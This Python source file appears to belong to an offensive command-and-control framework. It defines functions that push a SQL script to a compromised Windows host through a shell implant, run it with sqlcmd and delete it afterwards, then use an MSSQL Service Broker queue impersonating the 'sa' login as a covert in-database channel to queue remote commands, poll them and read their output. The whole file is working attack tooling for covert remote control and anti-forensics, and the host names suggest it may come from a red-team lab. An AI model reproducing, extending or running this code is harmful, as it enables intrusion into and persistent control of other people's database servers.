import os
import shutil
import time

# controlShell/xp_mssql/ -> ../../controlServer/sql/
_SQL_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "..", "..", "controlServer", "sql")
# controlShell/xp_mssql/ -> ../../payloads/
_PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "..", "..", "payloads")


class XpAgentMixin:
    """In-DB C2 channel via xpagent Service Broker queue on IIS01."""

    def cmd_xpagent_init(self, shell, timeout_s: int = 60):
        """Stage xpagent_init.sql to WS01 via ToneShell FILE_DOWNLOAD and run via sqlcmd -i."""
        src = os.path.join(_SQL_DIR, "xpagent_init.sql")
        dst = os.path.join(_PAYLOADS_DIR, "xpagent_init.sql")
        try:
            shutil.copy2(src, dst)
        except OSError as e:
            print(f"[!] xpagent_init: cannot copy to payloads dir: {e}")
            return
        remote_sql = r"C:\Windows\Temp\xpagent_init.sql"
        print("[*] xpagent_init: pushing SQL to WS01 ...")
        shell.cmd_put_wait("xpagent_init.sql", remote_sql)
        print("[*] xpagent_init: running xpagent_init.sql on IIS01 ...")
        out = shell.cmd_exec_raw(f"{self._sqlcmd_prefix()} -i {remote_sql}", timeout_s=timeout_s)
        print(out)
        shell.cmd_exec_raw(f"cmd /c del /f {remote_sql}")
        print("[+] xpagent_init done")

    def cmd_xpagent_kill(self, shell):
        """Drop the xpagent database on IIS01."""
        tsql = (
            "USE master; EXECUTE AS LOGIN='sa';"
            "IF EXISTS (SELECT 1 FROM sys.databases WHERE name=N'xpagent')"
            " BEGIN ALTER DATABASE xpagent SET SINGLE_USER WITH ROLLBACK IMMEDIATE;"
            " DROP DATABASE xpagent; END"
        )
        out = self._exec_q(shell, tsql)
        print(out or "[+] xpagent database dropped")

    def _xpagent_insert(self, shell, cmd: str) -> "int | None":
        """INSERT a command into xpagent.dbo.cmd and return its cmd_id."""
        segs     = self._tsql_escape(cmd).split('"')
        val_expr = '+CHAR(34)+'.join(f"N'{s}'" for s in segs)
        insert_out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            f"INSERT INTO xpagent.dbo.cmd (cmd) VALUES ({val_expr});"
            "SELECT CAST(SCOPE_IDENTITY() AS INT);"
        )
        for line in (insert_out or "").splitlines():
            s = line.strip()
            if s.isdigit() and int(s) > 0:
                return int(s)
        print(f"[!] xpagent: could not get cmd_id — {insert_out!r}")
        return None

    def cmd_xpexec(self, shell, cmd: str, timeout_s: int = 120):
        """INSERT command into xpagent queue, poll until done, print output."""
        cmd_id = self._xpagent_insert(shell, cmd)
        if cmd_id is None:
            return
        print(f"[*] xpexec: cmd_id={cmd_id}, waiting ...")
        deadline = time.time() + timeout_s
        status = None
        while time.time() < deadline:
            status_out = self._exec_q(shell,
                f"EXECUTE AS LOGIN='sa';"
                f"SELECT status FROM xpagent.dbo.cmd WHERE id={cmd_id};"
            )
            for line in (status_out or "").splitlines():
                s = line.strip()
                if s.isdigit():
                    status = int(s)
                    break
            if status in (2, 3):
                break
            time.sleep(2)
        else:
            print(f"[!] xpexec: timed out (cmd_id={cmd_id}, last status={status})")
            return
        self.cmd_xpout(shell, cmd_id)

    def cmd_xpexec_bg(self, shell, cmd: str) -> "int | None":
        """Fire-and-forget INSERT into xpagent queue; print cmd_id for later xpout."""
        cmd_id = self._xpagent_insert(shell, cmd)
        if cmd_id is None:
            return None
        print(f"[*] xpexec-bg: queued cmd_id={cmd_id}  (check with: xpout {cmd_id})")
        return cmd_id

    def cmd_xpout(self, shell, cmd_id: int):
        """Read and print output rows for a given cmd_id from xpagent.dbo.out."""
        out = self._exec_q(shell,
            f"EXECUTE AS LOGIN='sa';"
            f"SELECT chunk FROM xpagent.dbo.out WHERE cmd_id={cmd_id} ORDER BY seq;"
        )
        print(out or f"(no output rows for cmd_id={cmd_id})")
